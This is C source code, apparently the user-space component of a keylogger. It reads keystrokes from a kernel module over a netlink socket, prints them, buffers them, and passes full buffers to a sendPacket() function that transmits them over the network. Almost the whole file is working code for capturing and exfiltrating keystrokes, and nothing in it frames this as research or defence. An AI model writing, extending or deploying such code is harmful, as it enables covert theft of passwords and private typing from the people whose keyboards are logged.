#include "user.h" //include user functions
#include "packetSend.h" //include packet functions
#include <unistd.h> //get pif and close socket
#include <stdio.h> //output
#include <stdlib.h> //realloc and malloc
#include <sys/socket.h> //socket programming
#include <string.h> //string functions
#include <linux/netlink.h> //net link programming
#include <errno.h> //show errors
struct nlmsghdr *send_msg = NULL; //contains msg info to send 
struct nlmsghdr *recv_msg = NULL; //contains msg info to receive
struct sockaddr_nl src_addr, dest_addr; 
struct iovec iov, iov2; //descirbe massage receiver and sender buffer 
struct msghdr msg, resp;  // famous struct msghdr, it includes "struct iovec *   msg_iov;"
int sock_fd; //socket
int init_socket() //initialize net link socket to communicate with the kernel
{
    
    sock_fd = socket(PF_NETLINK, SOCK_RAW,PORT ); //PF_NETLINK=>AF_NETLINK (netlink data),sock_raw =>an access to data link layer,port=>between kernel and user space
    if(sock_fd < 0)
        return -1;

    memset(&src_addr, 0, sizeof(src_addr)); //build struct to recieve massages
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid(); //self pid 
    if(bind(sock_fd, (struct sockaddr*)&src_addr, sizeof(src_addr))){ //bind struct to socket
        perror("bind() error\n");
        close(sock_fd);
        return -1;
    }

    memset(&dest_addr, 0, sizeof(dest_addr)); //build struct to send messages
    dest_addr.nl_family = AF_NETLINK; 
    dest_addr.nl_pid = 0;       //kernel's pid
    dest_addr.nl_groups = 0;    //unicast for one process
    send_msg = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD)); //allocate msg
    if(send_msg == NULL)
    {
        printf("error allocation");
        exit(1);
    }
    memset(send_msg, 0, NLMSG_SPACE(MAX_PAYLOAD));
    send_msg->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD); //define send message struct len
    send_msg->nlmsg_pid = getpid();  //self pid
    send_msg->nlmsg_flags = 0; 

    //recv_msg: contains received msg
    recv_msg = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
    if(recv_msg == NULL)
    {
        printf("error allocation");
        exit(1);
    }
    memset(recv_msg, 0, NLMSG_SPACE(MAX_PAYLOAD));
    recv_msg->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD); //define send message struct len
    recv_msg->nlmsg_pid = getpid();  //self pid
    recv_msg->nlmsg_flags = 0; 

    strncpy(NLMSG_DATA(send_msg), "ok",2);  //put "ok" msg into send_msg

    iov.iov_base = (void *)send_msg;  //make iov to handle nlmsghdr send_msg
    iov.iov_len = send_msg->nlmsg_len; 
    msg.msg_name = (void *)&dest_addr;  //msg handles dest_addr struct
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = &iov;                 //msg handles iov struct that contains nlmsghdr send_msg
    msg.msg_iovlen = 1;

    iov2.iov_base = (void *)recv_msg;         //make iov to handle nlmsghdr srecv_msg
    iov2.iov_len = recv_msg->nlmsg_len;
    resp.msg_name = (void *)&dest_addr;  //resp handles dest_addr struct
    resp.msg_namelen = sizeof(dest_addr);
    resp.msg_iov = &iov2;    //resp handles iov2 struct that contains nlmsghdr recv_msg
    resp.msg_iovlen = 1;
    return 1;
}
int transfer_data() //transfer data between kernel and user space
{
    int ret;
    int len=0; //bufffer len, we make new buffer and send in packet
    char *buffer; //buffer collects data from kerenl
    ret= sendmsg(sock_fd, &msg, 0); //send msg
    if(ret < 0)
        exit(1);      
    printf("Waiting for message from kernel\n");
    ret=recvmsg(sock_fd, &resp, 0);  //msg is also receiver for read
    buffer=(char*)malloc(sizeof(char)); //create buffer to send in packet
    if(buffer == NULL)
    {
        printf("Allocation error");
        return -1;
    }
    len++;
    if(ret < 0)
        exit(1); 
    strncpy(&buffer[0],(char *)NLMSG_DATA(recv_msg),1); //copy first key stroke to buffer
    printf("key stroke: %s\n", (char *) NLMSG_DATA(recv_msg)); 
    while (1) {
        strncpy(NLMSG_DATA(send_msg), "ok",2); //put "ok" as massage to send  
        ret = sendmsg(sock_fd, &msg, 0); //receive data in msg struct that connects with send_msg and there sent data is located 
        if(ret < 0)
            exit(1);   
        printf("Waiting for message from kernel\n");
        ret=recvmsg(sock_fd, &resp, 0);  //receive data in resp struct that connects with recv_msg and there received data is located 
        if(len <MAX_BUFFER)
        {
            buffer=(char*)realloc(buffer,(len+1)*sizeof(char)); //append buffer and put another keystroke
            if(buffer == NULL)
            {
                printf("Allocation error");
                return -1;
            }
            strncpy(&buffer[len],(char *)NLMSG_DATA(recv_msg),1);
            len++;
        }
        else
        {
            printf("%s",buffer); //print buffer to send in packet
            buffer=(char*)realloc(buffer,(len+1)*sizeof(char)); //realloc to put \0
            buffer[len]=0;
            sendPacket(buffer); //call send packet function and then packet would be sent
            memset(buffer,0,len); 
            free(buffer);
            len=1; //start again and making new buffer that will be sent in next packet
            buffer=(char*)malloc(sizeof(char));
            if(buffer == NULL)
            {
                printf("Allocation error");
                return -1;
            }
            strncpy(&buffer[0],(char *)NLMSG_DATA(recv_msg),1);

        }
        if(ret < 0)
            exit(1);
        if((char *)NLMSG_DATA(recv_msg))
        {
            printf("key stroke: %s\n", (char *)NLMSG_DATA(recv_msg)); //print key stroke
        }   
    }
    close(sock_fd); 
    return 1;
}